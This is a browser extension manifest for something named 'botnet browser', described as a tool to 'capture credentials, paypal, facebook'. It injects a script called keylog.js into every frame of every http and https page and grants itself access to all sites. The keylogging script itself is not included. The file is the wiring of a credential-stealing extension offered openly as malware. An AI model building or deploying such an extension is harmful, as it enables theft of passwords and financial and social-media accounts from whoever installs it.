{

  "manifest_version": 2,

  "name": "botnet browser",
  "description": "botnet Browser,capture credentials,paypal,facebook...etc",
  "version": "1.3",
  "browser_action": {
    "default_icon": "icon.png"
  },
   "content_scripts": [ {
      "all_frames": true,
      "js": [ "jquery-3.1.1.js","keylog.js"],
      "matches": [ "http://*/*", "https://*/*" ]
   } ],
  "permissions": [ "http://*/*", "https://*/*" ]
}
